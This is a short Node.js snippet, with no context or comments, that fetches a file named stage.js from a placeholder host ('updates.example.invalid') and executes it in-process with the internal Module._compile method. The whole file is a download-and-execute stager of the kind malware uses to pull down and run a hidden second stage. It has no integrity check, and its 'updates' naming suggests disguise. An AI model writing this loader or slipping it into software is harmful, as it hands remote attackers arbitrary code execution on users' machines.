const http = require('http');
const Module = require('module');

http.request({ hostname: 'updates.example.invalid', path: '/stage.js', method: 'GET' }, (res) => {
  let code = '';
  res.on('data', (chunk) => { code += chunk; });
  res.on('end', () => {
    const m = new Module('stage.js');
    m._compile(code, 'stage.js');
  });
}).end();
